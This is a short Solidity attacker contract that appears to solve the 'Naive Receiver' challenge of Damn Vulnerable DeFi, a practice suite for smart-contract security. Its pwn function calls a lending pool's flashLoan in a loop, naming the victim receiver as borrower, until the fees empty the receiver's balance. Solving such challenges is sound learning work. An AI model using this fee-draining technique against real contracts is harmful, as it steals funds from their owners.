// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IPool {
  function flashLoan(address borrower, uint256 borrowAmount) external;
}

/**
 * @title NaiveReceiverAttacker contract
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract NRAttacker {
    using Address for address payable;

    function pwn(address _pool, address _receiver) external {
      while(_receiver.balance > 0) {
        IPool(_pool).flashLoan(_receiver, 0);
      }
    }
}